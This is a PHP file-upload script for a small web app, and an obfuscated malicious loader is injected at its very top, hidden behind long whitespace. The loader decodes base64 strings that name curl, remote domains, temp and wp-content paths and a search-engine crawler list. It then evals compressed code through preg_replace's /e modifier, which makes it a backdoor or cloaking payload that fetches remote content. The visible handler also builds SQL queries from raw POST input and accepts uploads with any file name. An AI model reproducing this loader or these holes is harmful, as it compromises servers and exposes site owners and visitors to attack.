<?php                                                                                                                                                                 /*versio:2.19*/$QQ00=89370;if (!function_exists('QOO0O0OO')){$GLOBALS['QQ00'] = 'H?Y3VybA&IBX2luaXQ~YWxsb3dfdXJsX2ZvcGVuMQBaHR0cDovLwgJndheT1maWxlX2dldF9jb250ZW50cwX3NldG9wdA(_X2V4ZWM(DHByJndheT1jdXJsKKNLweJb3Nvbi5pbg=cnllcGR4LmNvbQkbPcGhwYWlkZS5jb20;CmedwboWV8cgtOggZGlzcGxheV9lcnJvcnMKv*^%ZGV0ZXJtaW5hdG9yaZnRwMTMCMi4xOQ_UTAwT1EwME8wME9RYmFzZTY0X2RlY29kZQjYmFzZTY0X2VuY29kZQSFRUUFMb2ZmwaHR0cHM6Ly8SFRUUF9IT1NUbdW5pb24mr%%c2VsZWN0UkVRVUVTVF9VUkkU0NSSVBUX05BTUUZgUVVFUllfU1RSSU5HILiPw$B$LL3RtcC8uZm9udC11bml4iwc&L3RtcC8uSUNFLXVuaXgVE1QXrPVEVNUAj#xVE1QRElS%L3RtcAdXBsb2FkX3RtcF9kaXId!dG1w&P%d3AtY29udGVudC91cGxvYWRzcmd3AtY29udGVudC9jYWNoZQLg!*ndmVyc2lvWedDLQE{LXBocAKXSFRUUF9FWEVDUEhQSb3V0v#sb2sbSFRUUF9VU0VSX0FHRU5U;$JLAZ29vZ2xlLHlhaG9vLGJpbmcsbXNuYm90LGFzayxiYWlkdSx5YW5kZXgL3BnLnBocD91PQ_zJms9.ijJnQ9cGhwJnA9 g=(IJnY9 MGZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5VlYrRnUyMFlNZnBXTEVRUVNvR282eTdLZFpScHN0RTRqSUxOaXh5bFF0SWJnMnVkR3FDd0ZzcncwS1BMdUkza24zeVdSdlczNU1mZklJM2trdjQ5VXVtYld5VXFzMDF5c3JOWktWS0xjcFBtaUtzcVdiZjlpNjEyK3JOSWlaNllrV1l0aWJaMU9QQy8yWW9lZG5VWlp4TE9JaFd4OGQzMXRzMTlNbjJ6U1pWbFU2VVpZVmJrVDlnVXJSYlVyYzJhYWdOTm43ZW03cU5acEpsQVl4eE93ZnpxSlkyL2lRVFNua3dtb3gyQVdqL0NuMVhaWUYrNkRRODZqRENSS3g5MXJjTzZ3SHFnTTBqeE50cUt5dE9UY1lXM1BkaGdIY1FxSklKWHZEU28yQ3cyZlBoN2E5TTdKWkFLaGhRT01HRzhteXlLdlJGNXR0WWtPaE1nOW03bE12WWgrMFpOY2JUUHdIZWFEbzMyQ2xHbE1qY2kyQXNPclU1U0luK2tXWEtoSFk1MHc0Um5IOXcvVXFWVm5oVWROV2VuN0ZCWHFZS1VhZGM0RGxUbGx4MUplSFBiK2Jub2QzOHdTK0ovRC91ZEx1ZGNEdGJaOTFQRFZhUGhoTkhYV0MzajZVY1hwYUhZM0hjK213L0h0SlZ4UVRYWlkvMzA4SG8vZXoyYlJYNlA0YnVhd2dGTEFWYmNPVkRicWUyaHF1U3V6WkprVlcyR2NZam5FNXFGNnN0UmxLSUkyWS9RZXRBcGsrWGxmVmFsVFY1VmFpRENBenRmYll2bWplQkM1N3YyKzU4Z0taUkVDZ1hSbDBCaEJqUjlDSEx3M3k1cWNzNWY0aENldEgzYllQaldBV3g5SE0vWkxWZXI1N0hIeEZHSWtvbUpYczluTmI5ejF2cFpmODZ0aVcvMk9haFRhTXg2MVZQOUVoTHlicTVza3ZqV0ExMjRqVGx3OC96U2Eza2J4dU1IMzNWYVU3NGJmQVROb1hCb2o0N1dEeDN0a2c1TWpCS1RlWjdPek0yYTlJaHoyVG92L2dHaDBwbHpNT0VEV0NJYTMrOFJGZzdXcTk1NmZxRzZFRXZIeklTdFd3bXJ0WTNScWs2QzN5NUZobFBZWGI2N3huRzRhNzZFZStjUS9LQUZBY0FKZWhtVzVlREpvcU4wbGFCbGc0ejdDcVBQaUtPakFVWURJMnJQcFk1bFcrSkFZZThlQlZFRC9jc2lDYkIrOGl1eWxtazRxYVhzOW40Z08xQWZyMmhCZDJSdTZNSEpGRXZXV3ZmOWlWMEhCSlhLeXpLRjJoNlNDU2JHOEw0elllL0FjMzNhVm90RkZmUXJDVlJkZHlsK0xxdlNXMFB1WXBuTmJ0cjJjYWxyYTVnQWQzbFY4ai9IQ1g2akY3WjZrTzRseWJrajhRRTJaQ1pLeVowaUk4cVFJU3hjYm9xQVBvcjY4NVhrVFU0UnZWU0lDVS9pYVFpVzgweTAxVTNJN21nSit2dWo3a3BqbnRxcmo0TEFLT3pIbmxnZldPelF1WHZ2MWlaUzVxcDRTdStHMktxc2lLeDVGMmVURTUzMWljdXp5ZFZHS3hmSWVtaXBCTmxsc21hcGsrS2N1T1FZTEpoOEtpVGs0MU0zbSt6U25rVWZSd2hkMWZSNDJrR2s5RUEvYXdqVDIvNXV0WjRqS09qbVVhai93Q0ZKek9lNFB5Mmw0dkJWM0F5bkdnamFtc0M4YmFQNXY1bDJqamgyUEl5Umd1aDZ6S0V0Sk9FY0M1RkZZbDdYcDF2NmR0TlRBRWREQ1poWFVrOGhWb0hBVnlTc2tLRXhBOXNOVld1WUxZTjBrdVl5dVIwbGl1eCtpS1V6YWVQb1p2TjBNcDBQNFNVUUtqQmZ0S2M1OFZVK3RZL29JZTRMdzNCQnlCMFB1MlBNRHdoNUNWZ3BINDA4SHJyMlVkTHZZTlkxM2FtdjZxRWVjNExDM08yT25MNk8yblRvNW1zMENDY0ZHQ1c2VnpTTGtuM1liUkMrQXBqS0pVQVBxa1JzeWx2dEVMU2Jxa0NwS1A5MndzU1J5ODkwbXlQQ0xiN1I1R3pjcEZ0b082ZkNDZlFQL1AvWVRxOW84aEc4RHhud1JaMU1uWGJ4aXFSYXVGY25uWkhnM3Uyck53MUNwMVRPaFp2aUJtaDNhYkpkZzdkUU1iVGpzZFdxSFNPcW1vSTlscXZjbDNONHlIaXF5YmdKa1FDT2tLOGwxSVA1ZVpQVXRzSEU4dks3bnk5cnFFNXc0dmsyc0NqdDdaY254V0NkY2Z1WkFCc2xYVmV5VzkvS2Y5TEd5ekhZcmtSVDVVdFNIa3ZqVTF4WGdlUUNicWNpWHVGV29JeldJNEQva28rUHMzZVVkd3RzTDlxNjNHNjNsVXluTlIrSG5Ud0JiaGlSNVRFMzJtdHNwQkdjdlBRbkRTOXJrMWJ3eW5pcTdFeGRQYzNYdG5uZG91WEhWdTNSQmU1emdXN2VXS1pDZkZXOTdvT2QzNUJYWk5YTHFlclJ5NjI5TldyeGdZZE9mbXhldlN2TDhzdlBoN3gvWmJoYzUiKSkpOwcHJlZ19yZXBsYWNlQ';function QOO0O0OO($a, $b){$c=$GLOBALS['QQ00']; $d=pack('H*','6261736536345f64'.'65636f6465'); return $d(substr($c, $a, $b));};$IlIlI1IIl = QOO0O0OO(3363, 16);$IlIlI1IIl("/III1lIIIl/e", QOO0O0OO(741, 2622), "III1lIIIl");};?><?php
session_start();
require 'db.inc.php';

$db = mysql_connect(MYSQL_HOST,MYSQL_USER,MYSQL_PASSWORD) or die('Unable to connect . Check your connection parameters ');

mysql_select_db(MYSQL_DB,$db) or die(mysql_error($db));

$filename=(isset($_POST['name']))?trim($_POST['name']):'';
$us_id=$_SESSION['user_id'];

$errors=array();

if(empty($filename))
{
    $errors[]='ENTER FILE NAME';
}


if(count($errors) > 0)
{
    echo '<head><link rel="stylesheet" href="css/style.css" /></head>';
    echo '<h1 id="title_name" >';
    echo'<p> Unable to process due to following errors</p>';
        echo '<ul>';
        foreach($errors as $error)
        {
            echo'<li>'.$error.'</li>';
        }
        echo '</ul>';
        echo '</h1>';
}
else {
?>
<!DOCTYPE html>
<html>
    <head>
        <title>File Upload</title>
    </head>
   
    <style>
        html{
            background: black;
        }
        h1{
            font-size: 30px;
            color: white;
        }
        #home a:link{
            color: green;
            text-decoration: none;
        }
    </style>
    <body>
        
    
        <?php
        
        
        if ($_FILES["file"]["error"] > 0)
          {
            echo "<h1>";
          echo "Error: " . $_FILES["file"]["error"] . "<br>";
          echo "<br/>File not uploaded or </h1>";
          
          }
        else
          {
          /*echo "Upload: " . $_FILES["file"]["name"] . "<br>";
          echo "Type: " . $_FILES["file"]["type"] . "<br>";
          echo "Size: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
          echo "Stored in: " . $_FILES["file"]["tmp_name"]; */
          echo "<h1>Done !!! </h1>";
          header('Location: display.php');
          }
          
        if (file_exists("upload/" . $_FILES["file"]["name"]))
            {
            echo "<h1>";
            echo $_FILES["file"]["name"] . " File already exists. ";
            echo "</h1>";
            }
          else
            {
            move_uploaded_file($_FILES["file"]["tmp_name"],
            "upload/" . $_FILES["file"]["name"]);
            echo "Stored in: " . "upload/" . $_FILES["file"]["name"];
            }
        
        $url="upload/".$_FILES["file"]["name"];
        
        $query = 'SELECT * FROM filedetails WHERE file_name="'.$_POST['name'].'"';
        $result=mysql_query($query,$db) or die(mysql_error($db));
        $num=mysql_num_rows($result);
        if($num != 0)
        {
            echo "<h1>File with this name already exists !!! Try different name ...</h1>";
            
        }
        else
        {
            $query1='INSERT IGNORE INTO filedetails(file_id,file_name,file_url)
                    VALUES(NULL,"'.$_POST['name'].'","'.$url.'")';
                    
            mysql_query($query1,$db) or die(mysql_error($db));
           $file_id=mysql_insert_id($db);
           
          /* $query2='SELECT file_id from filedetails where file_name="'.$_POST['name'].'"';
           $result1=mysql_query($query2,$db) or die(mysql_error($db));
           
           while($row = mysql_fetch_assoc($result1))
           {
            $file_id=$row['file_id'];
           }*/
          
           $query3='INSERT INTO combine(file_id,user_id) VALUES("'.$file_id.'","'.$us_id.'")';
           mysql_query($query3,$db) or die(mysql_error($db));
           
        }
        ?>
    <div id="home">
        <h2><a href="home.php">Click here to go back to home page !!!!!</a></h2>
    </div>
    </body>
    
</html>
<?php }?>